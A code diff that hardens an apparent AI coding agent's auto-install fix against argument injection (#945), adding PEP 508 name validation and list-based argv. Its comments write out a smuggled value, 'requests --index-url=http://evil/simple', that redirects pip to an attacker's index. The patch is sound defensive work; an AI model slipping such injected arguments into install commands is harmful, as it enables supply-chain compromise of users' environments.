@@ -10,11 +10,14 @@ Fixes common errors without requiring LLM calls:
 This module is headless - no FastAPI or HTTP dependencies.
 """
 
+import logging
 import re
 from dataclasses import dataclass
 from enum import Enum
 from pathlib import Path
 from typing import Optional, Callable
+
+logger = logging.getLogger(__name__)
 
 
 class FixType(str, Enum):
@@ -40,6 +43,9 @@ class QuickFix:
         old_content: Content to find/replace
         new_content: Replacement content
         insert_line: Line number to insert at (1-based)
+        package: Validated PEP 508 package name for INSTALL_PACKAGE. Carried
+            separately from ``command`` so the install can build an argv LIST in
+            code rather than str.split() a formatted string (#945).
         insert_content: Content to insert
     """
 
@@ -51,6 +57,7 @@ class QuickFix:
     new_content: Optional[str] = None
     insert_line: Optional[int] = None
     insert_content: Optional[str] = None
+    package: Optional[str] = None
 
 
 # Mapping from common import names to package names
@@ -76,6 +83,24 @@ STDLIB_MODULES = {
     "signal", "platform", "getpass", "glob", "fnmatch", "textwrap",
     "string", "decimal", "fractions", "statistics", "secrets", "uuid",
 }
+
+
+
+#: PEP 508 name grammar: letters/digits, with . _ - allowed INTERNALLY only.
+#: Deliberately strict — no spaces, no '=', no '/', so no argv smuggling.
+_PEP508_NAME = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?$")
+
+
+def _is_valid_package_name(name: str) -> bool:
+    """Whether ``name`` is a bare PEP 508 package name and nothing else.
+
+    Guards the install path (#945). The permissive extraction regex accepts
+    anything between quotes, so spaces, dashes and '=' all reach the command —
+    and the command was executed via ``str.split()``, which turns
+    ``requests --index-url=http://evil/simple`` into extra pip arguments that
+    redirect the install to an attacker's index.
+    """
+    return bool(name) and len(name) <= 128 and bool(_PEP508_NAME.fullmatch(name))
 
 
 def detect_package_manager(repo_path: Path) -> str:
@@ -159,10 +184,24 @@ def match_module_not_found(error: str) -> Optional[QuickFix]:
             # Get actual package name
             package = PACKAGE_ALIASES.get(module, module)
 
+            # The name is ATTACKER-CHOSEN (#945): this error text comes from
+            # executing the target repo's tests and from LLM output, so a
+            # malicious repo need only print a fabricated ModuleNotFoundError.
+            # Anything that is not a bare PEP 508 name produces no fix at all —
+            # `requests --index-url=http://evil/simple` must not become argv.
+            if not _is_valid_package_name(package):
+                logger.warning(
+                    "Refusing to build an install fix for %r: not a valid "
+                    "package name.",
+                    package,
+                )
+                return None
+
             return QuickFix(
                 fix_type=FixType.INSTALL_PACKAGE,
                 description=f"Install missing package: {package}",
                 command=f"{{package_manager}} {package}",
+                package=package,
             )
 
     return None
@@ -481,6 +520,27 @@ def find_quick_fix(
     return None
 
 
+
+def _install_argv(fix: "QuickFix", repo_path: Path) -> Optional[list[str]]:
+    """Build the install argv as a LIST, from a re-validated package name (#945).
+
+    Re-validates rather than trusting ``fix.package``: a QuickFix can be
+    constructed or mutated between matching and applying, and this is the last
+    point before ``subprocess.run``. The package manager comes from
+    ``detect_package_manager``, a closed set — never from the error text.
+    """
+    package = fix.package
+    if not package or not _is_valid_package_name(package):
+        logger.warning("Refusing to install %r: not a valid package name.", package)
+        return None
+
+    pm = detect_package_manager(repo_path)
+    # detect_package_manager returns a command string like "uv pip install" or
+    # "npm install"; split THAT (our own constant), then append the name as one
+    # argument so it can never become multiple.
+    return [*pm.split(), package]
+
+
 def apply_quick_fix(
     fix: QuickFix,
     repo_path: Path,
@@ -508,8 +568,16 @@ def apply_quick_fix(
 
             from codeframe.core.agent_env import build_agent_env
 
+            # argv LIST built in code, never str.split() of a formatted string
+            # (#945). Splitting on whitespace let error text like
+            # `requests --index-url=http://evil/simple` inject extra pip/uv/npm
+            # arguments and redirect the install to an attacker's index.
+            argv = _install_argv(fix, repo_path)
+            if argv is None:
+                return False, "Refusing to install: no validated package name"
+
             result = subprocess.run(
-                fix.command.split(),
+                argv,
                 cwd=repo_path,
                 capture_output=True,
                 text=True,
@@ -521,7 +589,7 @@ def apply_quick_fix(
             )
 
             if result.returncode == 0:
-                return True, f"Installed package: {fix.command}"
+                return True, f"Installed package: {fix.package}"
             else:
                 return False, f"Install failed: {result.stderr}"
 
